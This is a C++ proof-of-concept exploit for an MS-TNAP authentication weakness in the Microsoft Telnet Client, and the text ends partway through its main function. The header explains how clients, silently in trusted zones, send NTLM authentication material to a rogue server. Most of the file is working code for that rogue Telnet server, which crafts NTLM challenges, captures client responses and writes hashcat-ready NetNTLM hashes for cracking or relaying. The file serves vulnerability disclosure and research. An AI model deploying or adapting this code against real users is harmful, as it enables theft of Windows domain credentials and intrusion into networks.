/* Microsoft Telnet Client MS-TNAP Server-Side Authentication Token Exploit
 * ========================================================================
 * This Proof of Concept (PoC) exploits a vulnerability in the MS-TNAP protocol
 * used by the Microsoft Telnet Client. When a client connects to a Telnet server
 * via telnet.exe or telnet:// URI hyperlinks and the MS-TNAP extension is detected,
 * the client may send authentication credentials to the server. This attack can also
 * be embedded in .LNK files or similar.
 *
 * For servers in untrusted zones (like Internet zone), the client prompts the user with a warning:
 *
 * "You are about to send your password information to a remote computer in Internet zone.
 * This might not be safe. Do you want to send anyway (y/n):"
 *
 * However, for servers in trusted zones (Intranet zone or Trusted Sites), or when zone
 * policies are configured for silent authentication, credentials can be sent automatically
 * WITHOUT ANY PROMPT, making this vulnerability even more dangerous in enterprise environments.
 *
 * This issue is particularly severe when hosts are added to trusted zones without protocol
 * specifiers (e.g., "192.168.1.1" rather than "http://192.168.1.1"). When a host is added
 * without a protocol specifier, Windows applies the trust setting to ALL protocols for that
 * host, including Telnet. Many organizations commonly configure their Intranet Zone or
 * Trusted Sites Zone with IP addresses or hostnames without protocol specifiers, which
 * inadvertently enables silent credential theft via Telnet connections.
 *
 * If the user responds "yes" to the prompt (or if no prompt is shown due to zone settings),
 * this PoC completes the MS-TNAP process and extracts cryptographic authentication material, 
 * which can be used for NTLM relaying or offline cracking attacks. This application will 
 * write a telnetclientpoc.log with NTLM trace data extracted from the connection. It will 
 * also write hashcat compatible NetNTLMv2 responses to a file for offline hash cracking.
 *
 * Compile with:
 * cl telnetclientpoc.cpp getopt.cpp stdafx.cpp /EHsc /MT ws2_32.lib secur32.lib
 *
 * Vulnerable Clients:
 *   The Microsoft Telnet Client with MS-TNAP extension support is impacted on:
 *   - Windows NT 4.0
 *   - Windows 2000
 *   - Windows XP
 *   - Windows Server 2003
 *   - Windows Server 2003 R2
 *   - Windows Vista
 *   - Windows Server 2008
 *   - Windows Server 2008 R2
 *   - Windows 7
 *   - Windows Server 2012
 *   - Windows Server 2012 R2
 *   - Windows 8
 *   - Windows 8.1
 *   - Windows 10
 *   - Windows Server 2016
 *   - Windows Server 2019
 *   - Windows Server 2022
 *   - Windows 11
 *   - Windows Server 2025
 *
 * Hacker Fantastic
 * https://hacker.house
 */
#include "stdafx.h"
#include "getopt.h"
#include <vector>
#include <string>
#include <random>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <sstream>

// Define Telnet constants
#define IAC 255
#define SB 250
#define SE 240
#define TO_AUTH 37
#define TO_NEWENV 39

// Declare a global variable to store the challenge
std::vector<unsigned char> global_challenge;

// Utility to print hex data
void print_hex(const unsigned char* data, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02X ", data[i]);
    }
    printf("\n");
}

// Utility to convert bytes to hex string
std::string bytes_to_hex(const std::vector<unsigned char>& bytes) {
    std::stringstream ss;
    for (auto byte : bytes) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)byte;
    }
    return ss.str();
}

// Function to generate random challenge (8 bytes)
std::vector<unsigned char> generate_random_challenge() {
    std::vector<unsigned char> challenge(8);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 255);
    for (int i = 0; i < 8; ++i) {
        challenge[i] = static_cast<unsigned char>(dist(gen));
    }
    return challenge;
}

// Function to convert hex string to bytes
std::vector<unsigned char> hex_to_bytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = static_cast<unsigned char>(std::stoi(byteString, nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

// Function to pad or truncate string to 6 characters and convert to Unicode
std::vector<unsigned char> to_unicode(const std::string& str) {
    std::string padded = str.substr(0, 6);
    while (padded.length() < 6) padded += ' ';
    std::vector<unsigned char> unicode;
    for (char c : padded) {
        unicode.push_back(static_cast<unsigned char>(c));
        unicode.push_back(0x00);
    }
    return unicode;
}

// Function to read a string from NTLM message (Unicode or ASCII)
std::string read_ntlm_string(const std::vector<unsigned char>& data, uint32_t offset, uint16_t len, bool unicode = true) {
    std::string result;
    if (offset + len <= data.size()) {
        if (unicode) {
            for (size_t i = 0; i < len; i += 2) {
                if (offset + i + 1 < data.size()) {
                    unsigned char low = data[offset + i];
                    unsigned char high = data[offset + i + 1];
                    if (high == 0) {
                        result += static_cast<char>(low);
                    }
                }
            }
        } else {
            result = std::string(data.begin() + offset, data.begin() + offset + len);
        }
    }
    return result;
}

// Function to parse NTLM Type 1 message
void parse_ntlm_type1(FILE* log, const std::vector<unsigned char>& data) {
    if (data.size() < 32) {
        fprintf(log, "Invalid NTLM Type 1 message: too short\n");
        printf("Invalid NTLM Type 1 message: too short\n");
        fflush(log);
        return;
    }
    if (!std::equal(data.begin(), data.begin() + 8, "NTLMSSP\0")) {
        fprintf(log, "Invalid NTLM Type 1 signature\n");
        printf("Invalid NTLM Type 1 signature\n");
        fflush(log);
        return;
    }
    uint32_t type = data[8] | (data[9] << 8) | (data[10] << 16) | (data[11] << 24);
    if (type != 1) {
        fprintf(log, "Not an NTLM Type 1 message\n");
        printf("Not an NTLM Type 1 message\n");
        fflush(log);
        return;
    }

    uint32_t flags = data[12] | (data[13] << 8) | (data[14] << 16) | (data[15] << 24);
    fprintf(log, "NTLM Type 1 Message:\n");
    printf("NTLM Type 1 Message:\n");
    fprintf(log, "  Signature: %s\n", std::string(data.begin(), data.begin() + 8).c_str());
    printf("  Signature: %s\n", std::string(data.begin(), data.begin() + 8).c_str());
    fprintf(log, "  Flags: 0x%08X\n", flags);
    printf("  Flags: 0x%08X\n", flags);
    if (flags & 0x00000001) { fprintf(log, "    - Negotiate Unicode\n"); printf("    - Negotiate Unicode\n"); }
    if (flags & 0x00000002) { fprintf(log, "    - Negotiate OEM\n"); printf("    - Negotiate OEM\n"); }
    if (flags & 0x00000004) { fprintf(log, "    - Request Target\n"); printf("    - Request Target\n"); }
    if (flags & 0x00000010) { fprintf(log, "    - Negotiate Sign\n"); printf("    - Negotiate Sign\n"); }
    if (flags & 0x00000020) { fprintf(log, "    - Negotiate Seal\n"); printf("    - Negotiate Seal\n"); }
    if (flags & 0x00000040) { fprintf(log, "    - Negotiate Datagram\n"); printf("    - Negotiate Datagram\n"); }
    if (flags & 0x00000080) { fprintf(log, "    - Negotiate Lan Manager Key\n"); printf("    - Negotiate Lan Manager Key\n"); }
    if (flags & 0x00000200) { fprintf(log, "    - Negotiate NTLM\n"); printf("    - Negotiate NTLM\n"); }
    if (flags & 0x00008000) { fprintf(log, "    - Negotiate Always Sign\n"); printf("    - Negotiate Always Sign\n"); }
    if (flags & 0x00010000) { fprintf(log, "    - Target Type Domain\n"); printf("    - Target Type Domain\n"); }
    if (flags & 0x00020000) { fprintf(log, "    - Target Type Server\n"); printf("    - Target Type Server\n"); }
    if (flags & 0x00080000) { fprintf(log, "    - Negotiate Extended Session Security\n"); printf("    - Negotiate Extended Session Security\n"); }
    if (flags & 0x00800000) { fprintf(log, "    - Negotiate 128\n"); printf("    - Negotiate 128\n"); }
    if (flags & 0x20000000) { fprintf(log, "    - Negotiate Key Exchange\n"); printf("    - Negotiate Key Exchange\n"); }
    if (flags & 0x80000000) { fprintf(log, "    - Negotiate 56\n"); printf("    - Negotiate 56\n"); }

    uint16_t domain_len = data[16] | (data[17] << 8);
    uint32_t domain_offset = data[20] | (data[21] << 8) | (data[22] << 16) | (data[23] << 24);
    uint16_t workstation_len = data[24] | (data[25] << 8);
    uint32_t workstation_offset = data[28] | (data[29] << 8) | (data[30] << 16) | (data[31] << 24);

    std::string domain_str = read_ntlm_string(data, domain_offset, domain_len);
    std::string workstation = read_ntlm_string(data, workstation_offset, workstation_len);

    fprintf(log, "  Domain: %s\n", domain_str.c_str());
    printf("  Domain: %s\n", domain_str.c_str());
    fprintf(log, "  Workstation: %s\n", workstation.c_str());
    printf("  Workstation: %s\n", workstation.c_str());

    if (data.size() >= 40) {
        uint8_t major = data[32];
        uint8_t minor = data[33];
        uint16_t build = data[34] | (data[35] << 8);
        fprintf(log, "  OS Version: %u.%u (Build %u)\n", major, minor, build);
        printf("  OS Version: %u.%u (Build %u)\n", major, minor, build);
    }
    fflush(log);
}

// Function to parse NTLM Type 2 message
void parse_ntlm_type2(FILE* log, const std::vector<unsigned char>& data) {
    fprintf(log, "Raw NTLM Type 2 Message: ");
    for (auto byte : data) {
        fprintf(log, "%02X ", byte);
    }
    fprintf(log, "\n");

    if (data.size() < 48) {
        fprintf(log, "Invalid NTLM Type 2 message: too short\n");
        printf("Invalid NTLM Type 2 message: too short\n");
        fflush(log);
        return;
    }
    if (!std::equal(data.begin(), data.begin() + 8, "NTLMSSP\0")) {
        fprintf(log, "Invalid NTLM Type 2 signature\n");
        printf("Invalid NTLM Type 2 signature\n");
        fflush(log);
        return;
    }
    uint32_t type = data[8] | (data[9] << 8) | (data[10] << 16) | (data[11] << 24);
    if (type != 2) {
        fprintf(log, "Not an NTLM Type 2 message\n");
        printf("Not an NTLM Type 2 message\n");
        fflush(log);
        return;
    }

    uint16_t target_name_len = data[12] | (data[13] << 8);
    uint32_t target_name_offset = data[16] | (data[17] << 8) | (data[18] << 16) | (data[19] << 24);
    uint32_t flags = data[20] | (data[21] << 8) | (data[22] << 16) | (data[23] << 24);
    std::vector<unsigned char> challenge(data.begin() + 24, data.begin() + 32);

    fprintf(log, "NTLM Type 2 Message:\n");
    printf("NTLM Type 2 Message:\n");
    fprintf(log, "  Signature: %s\n", std::string(data.begin(), data.begin() + 8).c_str());
    printf("  Signature: %s\n", std::string(data.begin(), data.begin() + 8).c_str());
    fprintf(log, "  Flags: 0x%08X\n", flags);
    printf("  Flags: 0x%08X\n", flags);
    if (flags & 0x00000001) { fprintf(log, "    - Negotiate Unicode\n"); printf("    - Negotiate Unicode\n"); }
    if (flags & 0x00000002) { fprintf(log, "    - Negotiate OEM\n"); printf("    - Negotiate OEM\n"); }
    if (flags & 0x00000004) { fprintf(log, "    - Request Target\n"); printf("    - Request Target\n"); }
    if (flags & 0x00000200) { fprintf(log, "    - Negotiate NTLM\n"); printf("    - Negotiate NTLM\n"); }
    if (flags & 0x00080000) { fprintf(log, "    - Negotiate Extended Session Security\n"); printf("    - Negotiate Extended Session Security\n"); }
    fprintf(log, "  Challenge: ");
    printf("  Challenge: ");
    for (auto byte : challenge) {
        fprintf(log, "%02X ", byte);
        printf("%02X ", byte);
    }
    fprintf(log, "\n");
    printf("\n");

    std::string target_name = read_ntlm_string(data, target_name_offset, target_name_len);
    fprintf(log, "  Target Name: %s\n", target_name.c_str());
    printf("  Target Name: %s\n", target_name.c_str());

    if (data.size() >= 56) {
        uint16_t target_info_len = data[40] | (data[41] << 8);
        uint32_t target_info_offset = data[44] | (data[45] << 8) | (data[46] << 16) | (data[47] << 24);
        if (target_info_offset + target_info_len <= data.size()) {
            fprintf(log, "  Target Info:\n");
            printf("  Target Info:\n");
            size_t pos = target_info_offset;
            while (pos < target_info_offset + target_info_len && pos + 4 <= data.size()) {
                uint16_t type = data[pos] | (data[pos + 1] << 8);
                uint16_t len = data[pos + 2] | (data[pos + 3] << 8);
                if (pos + 4 + len > data.size()) break;
                if (type == 0) break;
                std::string value = read_ntlm_string(data, pos + 4, len);
                const char* type_str = "Unknown";
                switch (type) {
                    case 1: type_str = "Server Name"; break;
                    case 2: type_str = "Domain Name"; break;
                    case 3: type_str = "FQDN"; break;
                    case 4: type_str = "DNS Domain Name"; break;
                    case 5: type_str = "DNS Tree Name"; break;
                }
                fprintf(log, "    %s: %s\n", type_str, value.c_str());
                printf("    %s: %s\n", type_str, value.c_str());
                pos += 4 + len;
            }
        }
    }

    if (data.size() >= 64) {
        uint8_t major = data[48];
        uint8_t minor = data[49];
        uint16_t build = data[50] | (data[51] << 8);
        fprintf(log, "  OS Version: %u.%u (Build %u)\n", major, minor, build);
        printf("  OS Version: %u.%u (Build %u)\n", major, minor, build);
    }
    fflush(log);
}

// Function to check if LM response is non-empty
bool is_lm_response_non_empty(const std::vector<unsigned char>& lm_resp) {
    for (auto byte : lm_resp) {
        if (byte != 0) {
            return true;
        }
    }
    return false;
}

// Function to format NTLM Type 3 data in Hashcat formats
void format_hashcat_output(FILE* log, const std::string& username, const std::string& domain, const std::string& host, 
                          const std::vector<unsigned char>& lm_resp, const std::vector<unsigned char>& ntlm_resp, 
                          const std::vector<unsigned char>& challenge) {
    if (challenge.size() != 8) {
        fprintf(log, "Invalid challenge length for Hashcat output\n");
        printf("Invalid challenge length for Hashcat output\n");
        return;
    }

    std::string challenge_hex = bytes_to_hex(challenge);

    // Debug print to verify global_challenge before NTLM Type 2 message
    printf("Global challenge before NTLM Type 2: ");
    for (auto byte : global_challenge) {
        printf("%02X ", byte);
    }
    printf("\n");

    // Debug print to verify global_challenge before hashcat format
    fprintf(log, "Global challenge before hashcat format: ");
    for (auto byte : global_challenge) {
        fprintf(log, "%02X ", byte);
    }
    fprintf(log, "\n");

    // NetNTLMv1 format: username::domain:challenge:ntlm_response:client_nonce
    if (ntlm_resp.size() >= 24 && is_lm_response_non_empty(lm_resp)) {
        std::vector<unsigned char> ntlmv1_resp(ntlm_resp.begin(), ntlm_resp.begin() + 24);
        std::vector<unsigned char> client_nonce(lm_resp.begin(), lm_resp.begin() + 8);
        std::string ntlmv1_hash = username + "::" + domain + ":" + challenge_hex + ":" + bytes_to_hex(ntlmv1_resp) + ":" + bytes_to_hex(client_nonce);
        fprintf(log, "Hashcat NetNTLMv1 Format: %s\n", ntlmv1_hash.c_str());
        printf("Hashcat NetNTLMv1 Format: %s\n", ntlmv1_hash.c_str());

        // Debug: Print each character of the hash to check for invisible characters
        fprintf(log, "NetNTLMv1 Hash Debug (length: %zu): ", ntlmv1_hash.length());
        for (char c : ntlmv1_hash) {
            fprintf(log, "%02X ", (unsigned char)c);
        }
        fprintf(log, "\n");

        // Write to ntlmv1.hash
        std::ofstream ntlmv1_file("ntlmv1.hash", std::ios::app);
        if (ntlmv1_file.is_open()) {
            ntlmv1_file << ntlmv1_hash << "\n";
            ntlmv1_file.close();
        } else {
            fprintf(log, "Error: Could not write to ntlmv1.hash\n");
            printf("Error: Could not write to ntlmv1.hash\n");
        }
    }

    // NetNTLMv2 format: username::domain:challenge:response_proof:response_blob
    if (ntlm_resp.size() > 24) {
        std::vector<unsigned char> response_proof(ntlm_resp.begin(), ntlm_resp.begin() + 16);
        std::vector<unsigned char> response_blob(ntlm_resp.begin() + 16, ntlm_resp.end());
        std::string netntlmv2_hash = username + "::" + domain + ":" + challenge_hex + ":" + bytes_to_hex(response_proof) + ":" + bytes_to_hex(response_blob);
        fprintf(log, "Hashcat NetNTLMv2 Format: %s\n", netntlmv2_hash.c_str());
        printf("Hashcat NetNTLMv2 Format: %s\n", netntlmv2_hash.c_str());

        // Debug: Print each character of the hash to check for invisible characters
        fprintf(log, "NetNTLMv2 Hash Debug (length: %zu): ", netntlmv2_hash.length());
        for (char c : netntlmv2_hash) {
            fprintf(log, "%02X ", (unsigned char)c);
        }
        fprintf(log, "\n");

        // Write to netntlmv2.hash
        std::ofstream netntlmv2_file("netntlmv2.hash", std::ios::app);
        if (netntlmv2_file.is_open()) {
            netntlmv2_file << netntlmv2_hash << "\n";
            netntlmv2_file.close();
        } else {
            fprintf(log, "Error: Could not write to netntlmv2.hash\n");
            printf("Error: Could not write to netntlmv2.hash\n");
        }
    }

    // Add debug print to verify challenge usage in format_hashcat_output
    fprintf(log, "Challenge used in hashcat format: %s\n", challenge_hex.c_str());
    printf("Challenge used in hashcat format: %s\n", challenge_hex.c_str());

    fflush(log);
}

// Function to parse NTLM Type 3 message
void parse_ntlm_type3(FILE* log, const std::vector<unsigned char>& data, const std::vector<unsigned char>& challenge) {
    fprintf(log, "Raw NTLM Type 3 Message: ");
    for (auto byte : data) {
        fprintf(log, "%02X ", byte);
    }
    fprintf(log, "\n");

    if (data.size() < 64) {
        fprintf(log, "Invalid NTLM Type 3 message: too short\n");
        printf("Invalid NTLM Type 3 message: too short\n");
        fflush(log);
        return;
    }
    if (!std::equal(data.begin(), data.begin() + 8, "NTLMSSP\0")) {
        fprintf(log, "Invalid NTLM Type 3 signature\n");
        printf("Invalid NTLM Type 3 signature\n");
        fflush(log);
        return;
    }
    uint32_t type = data[8] | (data[9] << 8) | (data[10] << 16) | (data[11] << 24);
    if (type != 3) {
        fprintf(log, "Not an NTLM Type 3 message\n");
        printf("Not an NTLM Type 3 message\n");
        fflush(log);
        return;
    }

    uint16_t lm_resp_len = data[12] | (data[13] << 8);
    uint32_t lm_resp_offset = data[16] | (data[17] << 8) | (data[18] << 16) | (data[19] << 24);
    uint16_t ntlm_resp_len = data[20] | (data[21] << 8);
    uint32_t ntlm_resp_offset = data[24] | (data[25] << 8) | (data[26] << 16) | (data[27] << 24);
    uint16_t domain_len = data[28] | (data[29] << 8);
    uint32_t domain_offset = data[32] | (data[33] << 8) | (data[34] << 16) | (data[35] << 24);
    uint16_t user_len = data[36] | (data[37] << 8);
    uint32_t user_offset = data[40] | (data[41] << 8) | (data[42] << 16) | (data[43] << 24);
    uint16_t host_len = data[44] | (data[45] << 8);
    uint32_t host_offset = data[48] | (data[49] << 8) | (data[50] << 16) | (data[51] << 24);
    uint16_t session_key_len = data[52] | (data[53] << 8);
    uint32_t session_key_offset = data[56] | (data[57] << 8) | (data[58] << 16) | (data[59] << 24);
    uint32_t flags = data[60] | (data[61] << 8) | (data[62] << 16) | (data[63] << 24);

    std::vector<unsigned char> lm_resp(data.begin() + lm_resp_offset, data.begin() + lm_resp_offset + lm_resp_len);
    std::vector<unsigned char> ntlm_resp(data.begin() + ntlm_resp_offset, data.begin() + ntlm_resp_offset + ntlm_resp_len);
    std::string domain_str = read_ntlm_string(data, domain_offset, domain_len);
    std::string user = read_ntlm_string(data, user_offset, user_len);
    std::string host = read_ntlm_string(data, host_offset, host_len);

    fprintf(log, "NTLM Type 3 Message:\n");
    printf("NTLM Type 3 Message:\n");
    fprintf(log, "  Signature: %s\n", std::string(data.begin(), data.begin() + 8).c_str());
    printf("  Signature: %s\n", std::string(data.begin(), data.begin() + 8).c_str());
    fprintf(log, "  Flags: 0x%08X\n", flags);
    printf("  Flags: 0x%08X\n", flags);
    if (flags & 0x00000001) { fprintf(log, "    - Negotiate Unicode\n"); printf("    - Negotiate Unicode\n"); }
    if (flags & 0x00000002) { fprintf(log, "    - Negotiate OEM\n"); printf("    - Negotiate OEM\n"); }
    if (flags & 0x00000200) { fprintf(log, "    - Negotiate NTLM\n"); printf("    - Negotiate NTLM\n"); }
    if (flags & 0x00080000) { fprintf(log, "    - Negotiate Extended Session Security\n"); printf("    - Negotiate Extended Session Security\n"); }
    fprintf(log, "  Domain: %s\n", domain_str.c_str());
    printf("  Domain: %s\n", domain_str.c_str());
    fprintf(log, "  Username: %s\n", user.c_str());
    printf("  Username: %s\n", user.c_str());
    fprintf(log, "  Host: %s\n", host.c_str());
    printf("  Host: %s\n", host.c_str());
    fprintf(log, "  LM Response: ");
    printf("  LM Response: ");
    for (auto byte : lm_resp) {
        fprintf(log, "%02X ", byte);
        printf("%02X ", byte);
    }
    fprintf(log, "\n");
    printf("\n");
    fprintf(log, "  NTLM Response: ");
    printf("  NTLM Response: ");
    for (auto byte : ntlm_resp) {
        fprintf(log, "%02X ", byte);
        printf("%02X ", byte);
    }
    fprintf(log, "\n");
    printf("\n");

    // Output Hashcat formats
    format_hashcat_output(log, user, domain_str, host, lm_resp, ntlm_resp, global_challenge);

    if (session_key_len > 0 && session_key_offset + session_key_len <= data.size()) {
        fprintf(log, "  Session Key: ");
        printf("  Session Key: ");
        for (size_t i = session_key_offset; i < session_key_offset + session_key_len; ++i) {
            fprintf(log, "%02X ", data[i]);
            printf("%02X ", data[i]);
        }
        fprintf(log, "\n");
        printf("\n");
    }

    if (data.size() >= session_key_offset + session_key_len + 8) {
        uint8_t major = data[session_key_offset + session_key_len];
        uint8_t minor = data[session_key_offset + session_key_len + 1];
        uint16_t build = data[session_key_offset + session_key_len + 2] | (data[session_key_offset + session_key_len + 3] << 8);
        fprintf(log, "  OS Version: %u.%u (Build %u)\n", major, minor, build);
        printf("  OS Version: %u.%u (Build %u)\n", major, minor, build);
    }
    fflush(log);
}

// Function to parse environment variables in Frame 10
void parse_environment_variables(FILE* log, const std::vector<unsigned char>& data) {
    size_t pos = 0;
    while (pos < data.size()) {
        if (pos + 1 < data.size() && data[pos] == IAC && data[pos + 1] == SB) {
            size_t se_pos = pos + 2;
            while (se_pos < data.size() - 1 && !(data[se_pos] == IAC && data[se_pos + 1] == SE)) se_pos++;
            if (se_pos < data.size() - 1) {
                std::vector<unsigned char> suboption(data.begin() + pos + 2, data.begin() + se_pos);
                if (!suboption.empty() && suboption[0] == TO_NEWENV && suboption.size() > 1 && suboption[1] == 0x00) {
                    size_t i = 2;
                    while (i < suboption.size()) {
                        if (suboption[i] == 0x03) {
                            i++;
                            size_t name_start = i;
                            while (i < suboption.size() && suboption[i] != 0x00 && suboption[i] != 0x01 && 
                                   suboption[i] != 0x02 && suboption[i] != 0x03) i++;
                            std::string name(suboption.begin() + name_start, suboption.begin() + i);
                            if (i < suboption.size() && suboption[i] == 0x01) {
                                i++;
                                size_t value_start = i;
                                while (i < suboption.size() && suboption[i] != 0x00 && suboption[i] != 0x01 && 
                                       suboption[i] != 0x02 && suboption[i] != 0x03) i++;
                                std::string value(suboption.begin() + value_start, suboption.begin() + i);
                                fprintf(log, "Environment Variable: %s = %s\n", name.c_str(), value.c_str());
                                printf("Environment Variable: %s = %s\n", name.c_str(), value.c_str());
                            } else {
                                fprintf(log, "Environment Variable: %s\n", name.c_str());
                                printf("Environment Variable: %s\n", name.c_str());
                            }
                        } else {
                            i++;
                        }
                    }
                }
                pos = se_pos + 2;
            } else {
                break;
            }
        } else {
            pos++;
        }
    }
    fflush(log);
}

// Function to extract NTLM message from Telnet frame data
std::vector<unsigned char> extract_ntlm_message(const std::vector<unsigned char>& data) {
    size_t pos = 0;
    while (pos < data.size()) {
        if (pos + 2 < data.size() && data[pos] == IAC && data[pos + 1] == SB && data[pos + 2] == TO_AUTH) {
            size_t se_pos = pos + 3;
            while (se_pos < data.size() - 1 && !(data[se_pos] == IAC && data[se_pos + 1] == SE)) se_pos++;
            if (se_pos < data.size() - 1) {
                std::vector<unsigned char> suboption(data.begin() + pos + 3, data.begin() + se_pos);
                size_t sig_start = 0;
                while (sig_start + 8 < suboption.size()) {
                    if (std::equal(suboption.begin() + sig_start, suboption.begin() + sig_start + 8, "NTLMSSP\0")) {
                        printf("NTLM signature found at position: %zu\n", sig_start);
                        return std::vector<unsigned char>(suboption.begin() + sig_start, suboption.end());
                    }
                    sig_start++;
                }
                pos = se_pos + 2;
            } else {
                break;
            }
        } else {
            pos++;
        }
    }
    return std::vector<unsigned char>();
}

// Function to create Type 2 frame with dynamic challenge, domain, and server
std::vector<unsigned char> create_type2_frame(FILE* log, const std::string& domain, const std::string& server, const std::vector<unsigned char>& challenge) {
    printf("Using domain: %s\n", domain.c_str());
    fprintf(log, "Using domain: %s\n", domain.c_str());

    printf("Using server: %s\n", server.c_str());
    fprintf(log, "Using server: %s\n", server.c_str());

    std::vector<unsigned char> challenge_to_use = challenge.empty() ? generate_random_challenge() : challenge;
    printf("Using challenge: ");
    fprintf(log, "Using challenge: ");
    for (auto byte : challenge_to_use) {
        printf("%02X ", byte);
        fprintf(log, "%02X ", byte);
    }
    printf("\n");
    fprintf(log, "\n");

    // Debug print to verify challenge insertion in create_type2_frame
    printf("Challenge inserted into Type 2 message: ");
    for (auto byte : challenge_to_use) {
        printf("%02X ", byte);
    }
    printf("\n");

    // Set global_challenge to the challenge used in the Type 2 message
    global_challenge = challenge_to_use;

    // Debug print to verify global_challenge after setting in create_type2_frame
    printf("Global challenge after setting: ");
    for (auto byte : global_challenge) {
        printf("%02X ", byte);
    }
    printf("\n");

    std::vector<unsigned char> type2_header = {
        IAC, SB, TO_AUTH, 0x02, 0x0F, 0x00, 0x01, 0x88, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x4E,
        0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x0C, 0x00, 0x38,
        0x00, 0x00, 0x00, 0x15, 0x82, 0x8A, 0xE2
    };

    type2_header.insert(type2_header.end(), challenge_to_use.begin(), challenge_to_use.end());

    std::vector<unsigned char> unicode_domain = to_unicode(domain);
    std::vector<unsigned char> unicode_server = to_unicode(server);

    std::vector<unsigned char> type2_footer = {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x00, 0x44, 0x00, 0x44, 0x00, 0x00, 0x00,
        0x05, 0x02, 0xCE, 0x0E, 0x00, 0x00, 0x00, 0x0F,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x0C, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x0C, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x0C, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 0x00, 0x0C, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, IAC, SE
    };

    std::copy(unicode_domain.begin(), unicode_domain.end(), type2_footer.begin() + 24);
    std::copy(unicode_domain.begin(), unicode_domain.end(), type2_footer.begin() + 40);
    std::copy(unicode_server.begin(), unicode_server.end(), type2_footer.begin() + 56);
    std::copy(unicode_domain.begin(), unicode_domain.end(), type2_footer.begin() + 72);
    std::copy(unicode_server.begin(), unicode_server.end(), type2_footer.begin() + 88);

    type2_header.insert(type2_header.end(), type2_footer.begin(), type2_footer.end());
    return type2_header;
}

// Main function
int main(int argc, char* argv[]) {
    std::string domain = "WIN2K3";
    std::string server = "WIN2K3";
    std::vector<unsigned char> challenge;
    std::string log_file = "telnetclientpoc.log";

    int opt;
    while ((opt = getopt(argc, argv, "d:s:c:o:")) != -1) {
        switch (opt) {
            case 'd':
                domain = optarg;
                break;
            case 's':
                server = optarg;
                break;
            case 'c':
                challenge = hex_to_bytes(optarg);
                if (challenge.size() != 8) {
                    printf("Error: Challenge must be 8 bytes (16 hex characters)\n");
                    return 1;
                }
                break;
            case 'o':
                log_file = optarg;
                break;
            default:
                printf("Usage: telnetclientpoc.exe [-d domain] [-s server] [-c challenge] [-o logfile]\n");
                return 1;
        }
    }

    FILE* log = fopen(log_file.c_str(), "a");
    if (!log) {
        printf("Error opening log file: %s\n", log_file.c_str());
        return 1;
    }

    WSADATA wsaData;
    SOCKET serverSocket;
    sockaddr_in serverAddr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed: %d\n", WSAGetLastError());
        fclose(log);
        return 1;
    }

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        fclose(log);
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(23);

    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Bind failed: %d\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        fclose(log);
        return 1;
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        printf("Listen failed: %d\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        fclose(log);
        return 1;
    }

    printf("Server listening on port 23...\n");

    while (true) {
        SOCKET clientSocket;
        sockaddr_in clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        unsigned char buffer[4096];
        int bytesReceived;
        std::vector<unsigned char> current_challenge;

        clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrSize);
        if (clientSocket == INVALID_SOCKET) {
            printf("Accept failed: %d\n", WSAGetLastError());
            continue;
        }
        printf("Client connected.\n");

        unsigned char frame4[] = {IAC, 0xFD, TO_AUTH, IAC, 0xFB, 0x01, IAC, 0xFB, 0x03, IAC, 0xFD, 0x27, IAC, 0xFD, 0x1F, IAC, 0xFD, 0x00, IAC, 0xFB, 0x00};
        if (send(clientSocket, (char*)frame4, sizeof(frame4), 0) == SOCKET_ERROR) {
            printf("send failed for Frame 4: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        }
        printf("Sent Frame 4\n");

        bytesReceived = recv(clientSocket, (char*)buffer, sizeof(buffer), 0);
        if (bytesReceived == SOCKET_ERROR) {
            printf("recv failed for Frame 5: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        } else if (bytesReceived == 0) {
            printf("Connection closed by client during Frame 5\n");
            closesocket(clientSocket);
            continue;
        }
        printf("Received Frame 5 (%d bytes): ", bytesReceived);
        print_hex(buffer, bytesReceived);

        unsigned char frame6[] = {IAC, SB, TO_AUTH, 0x01, 0x0F, 0x00, IAC, SE};
        if (send(clientSocket, (char*)frame6, sizeof(frame6), 0) == SOCKET_ERROR) {
            printf("send failed for Frame 6: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            continue;
        }
        printf("Sent Frame 6\n");

        bytesReceived = recv(clientSocket, (char*)buffer, sizeof(buffer), 0);
        if (bytesReceived == SOCKET_ERROR) {
